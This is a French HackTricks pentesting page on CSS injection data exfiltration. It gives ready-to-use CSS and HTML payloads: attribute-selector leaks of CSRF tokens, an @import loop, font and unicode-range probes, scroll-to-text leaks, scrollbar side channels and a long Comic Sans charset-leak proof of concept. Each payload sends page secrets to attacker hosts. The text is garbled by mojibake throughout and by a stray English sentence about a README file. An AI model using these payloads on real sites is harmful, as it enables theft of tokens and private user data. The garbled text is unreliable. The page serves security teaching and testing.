# Injection CSS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injection CSS

### S√©lecteur d'attribut

La technique principale pour exfiltrer des informations via l'injection CSS consiste √† essayer de **faire correspondre un texte avec CSS** et dans le cas o√π ce **texte existe, charger une ressource externe, comme :**
```css
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
```
Cependant, notez que cette technique ne fonctionnera pas si, dans l'exemple, l'**entr√©e de nom csrf** est de **type cach√©** (et elles le sont g√©n√©ralement), car l'arri√®re-plan ne sera pas charg√©.\
Cependant, vous pouvez **contourner** cet obstacle en faisant, au lieu de faire charger un arri√®re-plan √† l'√©l√©ment cach√©, **charger simplement n'importe quoi apr√®s lui l'arri√®re-plan :**
```css
input[name=csrf][value^=csrF] ~ * {
    background-image: url(https://attacker.com/exfil/csrF);
}
```
Voici un exemple de code pour exploiter cela : [https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)

#### Pr√©requis

1. L'injection CSS doit permettre des charges utiles suffisamment longues
2. Capacit√© √† **encadrer la page pour d√©clencher la r√©√©valuation CSS des nouvelles charges utiles g√©n√©r√©es**
3. Capacit√© √† utiliser des **images h√©berg√©es √† l'ext√©rieur** (peut √™tre bloqu√© par CSP)

### @import

La technique pr√©c√©dente pr√©sente quelques inconv√©nients, v√©rifiez les pr√©requis. Vous devez soit √™tre en mesure d'**envoyer plusieurs liens √† la victime**, soit √™tre en mesure d'**encadrer la page vuln√©rable √† l'injection CSS**.

Cependant, il existe une autre technique astucieuse qui utilise **CSS `@import`** pour am√©liorer la qualit√© de la technique.

Cela a √©t√© montr√© pour la premi√®re fois par [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) et cela fonctionne comme ceci :

Au lieu de charger la m√™me page une fois et encore avec des dizaines de charges utiles diff√©rentes √† chaque fois (comme dans la technique pr√©c√©dente), nous allons **charger la page une seule fois et juste avec une importation vers le serveur des attaquants** (c'est la charge utile √† envoyer √† la victime) :
```css
@import url('//attacker.com:5001/start?');
```
1. L'import va **recevoir un script CSS** de la part des attaquants et le **navigateur va le charger**.
2. La premi√®re partie du script CSS que l'attaquant enverra est **un autre `@import` vers le serveur des attaquants**.
   1. Le serveur des attaquants ne r√©pondra pas encore √† cette demande, car nous voulons divulguer quelques caract√®res avant de r√©pondre √† cet import avec la charge utile pour divulguer les suivants.
3. La deuxi√®me et plus grande partie de la charge utile va √™tre une **charge utile de fuite de s√©lecteur d'attribut**
   1. Cela enverra au serveur des attaquants le **premier caract√®re du secret et le dernier**
4. Une fois que le serveur des attaquants a re√ßu le **premier et le dernier caract√®re du secret**, il va **r√©pondre √† l'import demand√© √† l'√©tape 2**.
   1. La r√©ponse va √™tre exactement la m√™me que les **√©tapes 2, 3 et 4**, mais cette fois-ci, elle va essayer de **trouver le deuxi√®me caract√®re du secret, puis l'avant-dernier**.

L'attaquant va **suivre cette boucle jusqu'√† ce qu'il parvienne √† divulguer compl√®tement le secret**.

Vous pouvez trouver le [**code de Pepe Vila pour exploiter cela ici**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ou vous pouvez trouver presque le [**m√™me code mais comment√© ici**](./#css-injection).

{% hint style="info" %}
Le script va essayer de d√©couvrir 2 caract√®res √† chaque fois (du d√©but et de la fin) car le s√©lecteur d'attribut permet de faire des choses comme:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Cela permet au script de divulguer le secret plus rapidement.

{% hint style="warning" %}
Parfois, le script **ne d√©tecte pas correctement que le pr√©fixe + suffixe d√©couvert est d√©j√† le drapeau complet** et il continuera vers l'avant (dans le pr√©fixe) et vers l'arri√®re (dans le suffixe) et √† un moment donn√©, il se bloquera.\
Pas de soucis, v√©rifiez simplement la **sortie** car **vous pouvez y voir le drapeau**.
{% endhint %}

### Autres s√©lecteurs

D'autres fa√ßons d'acc√©der aux parties du DOM avec des **s√©lecteurs CSS** :

* **`.class-to-search:nth-child(2)`** : Cela recherchera le deuxi√®me √©l√©ment avec la classe "class-to-search" dans le DOM.
* S√©lecteur **`:empty`** : Utilis√© par exemple dans [**ce writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**&#x20;

    ```css
    [role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
    ```

### XS-Search bas√© sur les erreurs

**R√©f√©rence :** [Attaque bas√©e sur CSS : Abus de la plage de caract√®res Unicode de @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [PoC XS-Search bas√© sur les erreurs par @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

En gros, l'id√©e principale est d'**utiliser une police personnalis√©e provenant d'un point de terminaison contr√¥l√© par nous** dans un **texte qui ne sera affich√© que si la ressource ne peut pas √™tre charg√©e**.
```html
<!DOCTYPE html>
<html>
<head>
    <style>
    @font-face{
        font-family: poc; 
        src: url(http://ourenpoint.com/?leak); 
        unicode-range:U+0041;
    }

    #poc0{
        font-family: 'poc';
    }

    </style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
### Stylisation de fragments de texte de d√©filement

Lorsqu'un **fragment d'URL cible un √©l√©ment**, la pseudo-classe [**`:target`**](https://drafts.csswg.org/selectors-4/#the-target-pseudo) **peut √™tre utilis√©e** pour le s√©lectionner, mais **`::target-text` ne correspond √† rien**. Elle ne correspond qu'au texte qui est lui-m√™me cibl√© par le \[fragment].

Par cons√©quent, un attaquant pourrait utiliser le fragment de **texte de d√©filement** et si **quelque chose est trouv√©** avec ce texte, nous pouvons **charger une ressource** depuis le serveur de l'attaquant pour l'indiquer :
```
:target::before { content : url(target.png) }
```
Un exemple de cette attaque pourrait √™tre :
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
The file /hive/hacktricks/pentesting-web/xs-search/css-injection/README.md is sending the code.
```css
<style>:target::before { content : url(http://attackers-domain/?confirmed_existence_of_Administrator_username) }</style>
```
avec le fragment scroll-to-text: `#:~:text=Administrateur`

Si le mot Administrateur est trouv√©, la ressource indiqu√©e sera charg√©e.

Il existe trois principales mesures d'att√©nuation :

1. **STTF ne peut correspondre qu'√† des mots ou des phrases sur une page web**, ce qui rend th√©oriquement impossible la fuite de secrets ou de jetons al√©atoires (√† moins que nous ne d√©composions le secret en paragraphes d'une lettre).
2. Il est **restreint aux contextes de navigation de niveau sup√©rieur**, il ne fonctionnera donc pas dans un iframe, rendant l'attaque **visible pour la victime**.
3. **Un geste d'activation de l'utilisateur est n√©cessaire pour que STTF fonctionne**, donc seules les navigations qui sont le r√©sultat d'actions de l'utilisateur sont exploitables, ce qui diminue consid√©rablement la possibilit√© d'automatiser l'attaque sans interaction de l'utilisateur. Cependant, il existe certaines conditions que l'auteur du blog post ci-dessus a d√©couvertes qui facilitent l'automatisation de l'attaque. Un autre cas similaire sera pr√©sent√© dans PoC#3.
   1. Il existe quelques **bypass** pour cela comme **l'ing√©nierie sociale**, ou **forcer les extensions de navigateur courantes √† interagir**.

Pour plus d'informations, consultez le rapport original : [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Vous pouvez sp√©cifier des **polices externes pour des valeurs unicode sp√©cifiques** qui ne seront collect√©es que si ces valeurs unicode sont pr√©sentes sur la page. Par exemple :
```html
<style>
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?A); /* fetched */
    unicode-range:U+0041;
}
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?B); /* fetched too */
    unicode-range:U+0042;
}
@font-face{
    font-family:poc;
    src: url(http://attacker.example.com/?C); /* not fetched */
    unicode-range:U+0043;
}
#sensitive-information{
    font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Lorsque vous acc√©dez √† cette page, Chrome et Firefox r√©cup√®rent "?A" et "?B" car le n≈ìud de texte de sensitive-information contient les caract√®res "A" et "B". Mais Chrome et Firefox ne r√©cup√®rent pas "?C" car il ne contient pas "C". Cela signifie que nous avons pu lire "A" et "B".

### Exfiltration de n≈ìud de texte (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**R√©f√©rence:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Nous pouvons extraire le texte contenu dans un n≈ìud avec une technique qui combine les **ligatures de police** et la **d√©tection des changements de largeur**. L'id√©e principale derri√®re cette technique est la cr√©ation de polices qui contiennent une ligature pr√©d√©finie avec une **taille √©lev√©e** et l'utilisation de **changements de taille comme oracle**.

Les polices peuvent √™tre cr√©√©es sous forme de polices SVG, puis converties en woff avec fontforge. En SVG, nous pouvons d√©finir la largeur d'un glyphe via l'attribut **horiz-adv-x**, nous pouvons donc construire quelque chose comme `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, √©tant **XY une s√©quence de deux caract√®res**. **Si la s√©quence existe, elle sera rendue et la taille du texte changera**. Mais... comment pouvons-nous d√©tecter ces changements ?

Lorsque l'attribut white-space est d√©fini comme **nowrap**, il force le texte √† ne pas se rompre lorsqu'il d√©passe la largeur du parent. Dans cette situation, une **barre de d√©filement horizontale appara√Ætra**. Et nous pouvons **d√©finir le style de cette barre de d√©filement**, donc nous pouvons divulguer quand cela se produit **:)**
```css
body { white-space: nowrap }; 
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://ourendpoint.com/?leak); }
```
√Ä ce stade, l'attaque est claire :

1. Cr√©er des **polices** pour la combinaison de **deux caract√®res avec une largeur √©norme**
2. D√©tecter la **fuite via le truc de la barre de d√©filement**
3. En utilisant la premi√®re ligature divulgu√©e comme base, cr√©er de **nouvelles combinaisons de 3 caract√®res** (en ajoutant des caract√®res avant / apr√®s)
4. **D√©tecter** la **ligature de 3 caract√®res**.
5. R√©p√©ter jusqu'√† **divulguer tout le texte**

Nous avons encore besoin d'une m√©thode am√©lior√©e pour commencer l'it√©ration car `<meta refresh=...` est suboptimal. Vous pouvez utiliser le **truc CSS @import pour optimiser l'exploit**.

### Exfiltration de n≈ìud de texte (II) : divulgation de l'ensemble de caract√®res avec une police par d√©faut <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**R√©f√©rence :** [PoC utilisant Comic Sans par @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ce truc a √©t√© publi√© dans ce [**fil de discussion Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). L'ensemble de caract√®res utilis√© dans un n≈ìud de texte peut √™tre divulgu√© **en utilisant les polices par d√©faut** install√©es dans le navigateur : aucune police externe ou personnalis√©e n'est n√©cessaire.

La cl√© est d'utiliser une animation pour **augmenter la largeur de la div de 0 jusqu'√† la fin du texte**, la taille d'un caract√®re √† chaque fois. En faisant cela, nous pouvons "diviser" le texte en deux parties : un "pr√©fixe" (la premi√®re ligne) et un "suffixe", de sorte que chaque fois que la div augmente sa largeur, un nouveau caract√®re passe du "suffixe" au "pr√©fixe". Quelque chose comme :

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Lorsqu'un nouveau caract√®re passe √† la premi√®re ligne, le **truc de plage Unicode est utilis√© pour d√©tecter le nouveau caract√®re dans le pr√©fixe**. Cette d√©tection est effectu√©e en changeant la police en Comic Sans, dont la hauteur est sup√©rieure, de sorte qu'une **barre de d√©filement verticale est d√©clench√©e** (divulgation de la valeur du caract√®re). De cette fa√ßon, nous pouvons divulguer chaque caract√®re diff√©rent une fois. **Nous pouvons d√©tecter si un caract√®re est r√©p√©t√© mais pas quel caract√®re est r√©p√©t√©**.

{% hint style="info" %}
Essentiellement, le **truc de plage Unicode est utilis√© pour d√©tecter un caract√®re**, mais comme nous ne voulons pas charger une police externe, nous devons trouver un autre moyen.\
Lorsque le **caract√®re** est **trouv√©**, il est **donn√©** √† la police **Comic Sans pr√©-install√©e**, ce qui **rend** le caract√®re **plus grand** et **d√©clenche une barre de d√©filement** qui **divulguera le caract√®re trouv√©**.
{% endhint %}

V√©rifiez le code extrait du PoC :
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
    overflow-y: auto; /* leak channel */
    overflow-x: hidden; /* remove false positives */
    height: 40px; /* comic sans capitals exceed this height */
    font-size: 0px; /* make suffix invisible */
    letter-spacing: 0px; /* separation */
    word-break: break-all; /* small width split words in lines */
    font-family: rest; /* default */
    background: grey; /* default */
    width: 0px; /* initial value */
    animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
    animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
    font-size: 30px; /* prefix is visible in first line */
    text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
    0% { font-family: rest; } /* delay for width change */
    5% { font-family: has_A, rest; --leak: url(?a); }
    6% { font-family: rest; }
    10% { font-family: has_B, rest; --leak: url(?b); }
    11% { font-family: rest; }
    15% { font-family: has_C, rest; --leak: url(?c); }
    16% { font-family: rest }
    20% { font-family: has_D, rest; --leak: url(?d); }
    21% { font-family: rest; }
    25% { font-family: has_E, rest; --leak: url(?e); }
    26% { font-family: rest; }
    30% { font-family: has_F, rest; --leak: url(?f); }
    31% { font-family: rest; }
    35% { font-family: has_G, rest; --leak: url(?g); }
    36% { font-family: rest; }
    40% { font-family: has_H, rest; --leak: url(?h); }
    41% { font-family: rest }
    45% { font-family: has_I, rest; --leak: url(?i); }
    46% { font-family: rest; }
    50% { font-family: has_J, rest; --leak: url(?j); }
    51% { font-family: rest; }
    55% { font-family: has_K, rest; --leak: url(?k); }
    56% { font-family: rest; }
    60% { font-family: has_L, rest; --leak: url(?l); }
    61% { font-family: rest; }
    65% { font-family: has_M, rest; --leak: url(?m); }
    66% { font-family: rest; }
    70% { font-family: has_N, rest; --leak: url(?n); }
    71% { font-family: rest; }
    75% { font-family: has_O, rest; --leak: url(?o); }
    76% { font-family: rest; }
    80% { font-family: has_P, rest; --leak: url(?p); }
    81% { font-family: rest; }
    85% { font-family: has_Q, rest; --leak: url(?q); }
    86% { font-family: rest; }
    90% { font-family: has_R, rest; --leak: url(?r); }
    91% { font-family: rest; }
    95% { font-family: has_S, rest; --leak: url(?s); }
    96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
    0% { width: 0px }
    1% { width: 20px }
    2% { width: 40px }
    3% { width: 60px }
    4% { width: 80px }
    4% { width: 100px }
    5% { width: 120px }
    6% { width: 140px }
    7% { width: 0px }
}

div::-webkit-scrollbar {
    background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
    background: blue var(--leak);
}
```
## R√©f√©rences

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
